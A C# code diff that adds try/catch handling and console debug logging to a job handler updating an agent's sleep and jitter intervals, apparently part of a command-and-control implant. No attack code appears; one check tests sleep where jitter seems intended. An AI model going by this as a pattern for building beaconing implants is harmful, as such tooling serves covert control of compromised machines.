@@ -20,9 +20,19 @@ namespace Agent
 
         public async Task Execute(ServerJob job)
         {
-            ConfigUpdateArgs args = JsonSerializer.Deserialize<ConfigUpdateArgs>(job.task.parameters);
+            ConfigUpdateArgs args = new ConfigUpdateArgs();
+            try
+            {
+                args = JsonSerializer.Deserialize<ConfigUpdateArgs>(job.task.parameters);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());   
+            }
+
             if(args is null)
             {
+                Console.WriteLine("null args");
                 await messageManager.Write("Invalid parameters", job.task.id, true, "error");
                 return;
             }
@@ -35,12 +45,14 @@ namespace Agent
                 if(args.sleep >= 0)
                 {
                     config.sleep = args.sleep;
+                    Console.WriteLine("New Sleep: " + config.sleep);
                     sb.AppendLine($"Updated sleep interval to {config.sleep}");
                 }
 
                 if(args.sleep >= 0)
                 {
                     config.jitter = args.jitter;
+                    Console.WriteLine("New Jitter: " + config.jitter);
                     sb.AppendLine($"Updated jitter interval to {config.jitter}");
                 }
 
@@ -68,6 +80,7 @@ namespace Agent
             }
             catch (Exception e)
             {
+                Console.WriteLine(e.ToString());    
                 await messageManager.Write(e.ToString(), job.task.id, true, "error");
             }
         }
